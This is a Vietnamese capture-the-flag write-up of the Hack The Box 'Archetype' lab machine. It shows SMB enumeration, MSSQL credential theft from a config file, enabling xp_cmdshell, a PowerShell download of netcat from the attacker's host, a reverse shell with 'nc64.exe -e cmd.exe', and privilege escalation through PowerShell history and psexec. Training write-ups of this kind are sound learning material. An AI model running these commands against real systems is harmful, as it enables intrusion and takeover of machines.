> Archetype là một target Windows và ta sẽ khai thác lỗ hổng với việc cấu hình lỏng lẻo trong Microsoft SQL Server.
### 1. Tìm kiếm thông tin target
###### IP: 10.129.28.17
##### Kiểm tra kết nối:  `ping 10.129.28.17`
##### Kiểm tra cổng và dịch vụ:  `nmap -sC -sV 10.129.28.17`
##### => 135/tcp: MSRPC: một protocol mà program có thể sử dụng để yêu cầu dịch vụ từ program được đặt trên một máy tính khác cùng network.
##### => 139/tcp: NetBIOS-SSN: protocol sử dụng cho giao tiếp trong một LAN, chịu trách nhiệm cho thành lập và duy trì sessions giữa các computer trong một network.
##### => 445/tcp: sử dụng cho Microsoft-DS, chia sẻ file và tài nguyên trong network.
##### => *1433/tcp*: SMB ports, host database server.
##### + Từ đấy, ta biết được target là một *windows server*
### 2. Kiểm tra cổng 1443/tcp
##### + Kiểm tra SMB trên cổng 1433/tcp với smbclient:
` smbclient -N -L 10.129.28.17 `
###### -N: không pass.
###### -L: cho phép xem dịch vụ nào đang có trên server
##### => có được tên các tài khoản được sử dụng SMB: ADMIN$, backups, C$, IPC$.
##### + Kiểm tra truy cập từng từng tài khoản và sử dụng lệnh dir để kiểm tra thông tin trong tài khoản:
```
smbclient -N \\\\10.129.28.17\\<sharename>
=> ADMIN$ và C$ bị từ chối truy cập
=> backups và IPC$ truy cập được
Kiểm tra thông tin trong backups và IPC$
smb: \> dir
=> backups có file; IPC$ rỗng
=> tải file trong backups về máy:
smb: \> get prod.dtsConfig
```
##### + Kiểm tra file *prod.dtsConfig*:
```
$ cat prod.dtsConfig
<DTSConfiguation>
...
<ConfiguredValue>Data Source=.;Password=...;User ID=...
...
</DTSConfiguration>
```
##### => Có thông tin về user: *sql_svc* và pass: *M3g4c0rp123*
### 3. Truy cập vào MSSQL Server
##### + Sử dụng *Impacket tool*, một tool chuyên dụng giúp pentester truy cập với các network protocol và dịch vụ khác nhau. Trong trường hợp này sẽ tìm cách kết nối với MSSQL cùng với tên người dùng và mật khẩu lấy được từ SMB.
##### + Cài đặt và xem cách sử dụng *Impacket tool*: 
```
git clone https://github.com /SecureAuthCorp/impacket.git
cd impacket
pip3 install
cd examples
python3 mssqlclient.py -h
```
###### Xem thêm cách sử dụng: https://www.kali.org/tools/impacket/
##### + Kết nối với MSSQL Server:
`python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.28.17 -windows-auth`
###### -windows-auth: setting để sử dụng Windows Authen (mặc định 'False')
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/90040615-628e-4440-be7a-ccba13316eca)
##### => Đăng nhập vào MSSQL server thành công!

### 3.1 Tìm kiếm thông tin trong MSSQL
###### nguồn tham khảo sâu hơn sau khi thâm nhập MSSQL server: 
###### https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
###### https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
##### + Đầu tiên, kiểm tra vai trò người dùng: 
```
SQL (ARCHETYPE\sql_svc dbo@master)> SELECT is_srvrolemember('sysadmin');
-
1
```
##### + Output 1 = True; Tài khoản người dùng có quyền admin hệ thống, quyền cao nhất trong SQL.
##### + Set up thi hành lệnh thông qua xp_cmdshell:
` EXEC xp_cmdshell 'net user' `
###### EXEC: nói với hệ thổng ta sẽ thực thi lệnh (viết tắt của execution).
###### xp_cmdshell: một thủ tục lưu trữ mở rộng (extended stored procedure) trong SQL server cho phép thực thi một lệnh shell
###### net user: lệnh sẽ thi được thi hành, sử dụng để show thông tin tài khoản user trong hệ thống Window.
##### + Bị báo lỗi do mặc định thì *xp_cmdshell* sẽ bị vô hiệu hóa vì lí do bảo mật. Ta sẽ tái kích hoạt setting đó: 
```
EXEC sp_configure ‘show advanced options’ , 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
##### + Như vậy ta đã có thể thi hành lệnh trên hệ thống, kiểm tra:
```
SQL> xp_cmdshell "whoami"
output
------------------------------------------------------------------
archetype\sql_sbc
NULL
SQL>
```
### 3.2 Thực thi Reverse shell trên MSSQL:
##### + Tiếp theo, ta sẽ reverse shell để tăng độ ổn định khi kết nối. Ta sẽ upload file thực thi `nc64.exe` đến target và thực thi một process `cmd.exe` trên cổng lắng nghe:
###### + Tải file thực thi: https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
###### + Bắt đầu một HTTP server đơn giản và netcan để lắng nghe ở một tab khác:
```
sudo python3 -m http.server 80
sudo nc -lvnp 443
```
##### + Giờ ta sẽ upload file .exe vào target, sử dụng `Powershell` vì nó cung cấp nhiều lệnh hơn:
` powershell -c command `
##### + Vì không phải là tài khoản Admin (Admin hệ thống chỉ có quyền thực thi trong SQL, Admin là Windows nói chung) nên sẽ không có đủ quyền để upload file lên thư mục `system32`. Chuyển thư mục đến nơi mà tài khoản có thể thực thi đẩy file. `Downloads` là một thư mục cho việc đó. Ta sẽ sử dụng `wget` để lấy nc64.exe về thư mục Downloads.
`xp_cmdshell “powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.89/nc64.exe -outfile nc64.exe"`
##### + Xác nhận là target đã thực hiện request đó trên màn hình terminal server HTTP:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/7721e3da-7705-4235-a320-5f4bba1846b6)
##### + Liên kết cmd.exe qua nc đến listener:
`xp_cmdshell ‘poweshell -c cd C:\Users\sql_svc\Downloads ; .\nc64.exe -e cmd.exe 10.10.14.89 443’`
##### + Qua bên tab bật netcat, ta thấy đã Reverse shell thành công!
##### + Vào thư mục Desktop, gõ lệnh `type user.txt` và ta sẽ có flag của user.

### 3.3 Leo thang quyền lực (Privillege Escalation)
##### + tải winpeas về thư mục Download + di chuyển vào thư mục /home/hoang/Documents/archetype 
###### winPEASx64 chuyên dùng để quét các thư mục của target nhằm tìm lỗ hổng của thư mục, hệ thống, cấu hình hay hệ điều hành đó.
##### + vào lại target (đã reverse shell), kéo winPEASx64, tương tự như nc64
` wget http://10.10.14.89/winPEASx64.exe -outfile winPEASx64.exe `
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/7735d87b-30f2-4b66-9521-cc77f6912f8f)
##### + khởi chạy winPEASx64: .\winPEASx64.exe
 ![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/39821942-ffce-4242-b1a0-eded7f2a4de2)

###### việc quét winPEASx64 chỉ giúp làm quen, không có ích trong bài này.
##### + Trước tiên, kiểm tra 2 file mà có thể chứa danh tính người dùng.
###### Vì đây là tài khoản người dùng bình thường cũng như là tài khoản dịch vụ (service account), ta nên kiểm tra những file được truy cập thường xuyên. Ta sẽ đọc file lịch sử của Powershell, tương đương với .bash_history trong các máy Linux. File ConsoleHost_history.txt có thể được tìm thấy trong thư mục *C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\* .
` type ConsoleHost_history.txt `
##### => có được tài khoản *administrator* và mật khẩu *MEGACORP_4dm1n!!*
##### + Dùng tool psexec.py trong Impacket để vào shell với tài khoản admin: 
` python3 psexec.py administrator@10.129.95.187 `

![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/bbb8bda8-b609-440c-8b59-6d6014ac6d3b)
##### => Privillege escalation thành công!
##### Flag của Admin nằm trông C:\Users\Administrator\Desktop\root.txt
` type root.txt `

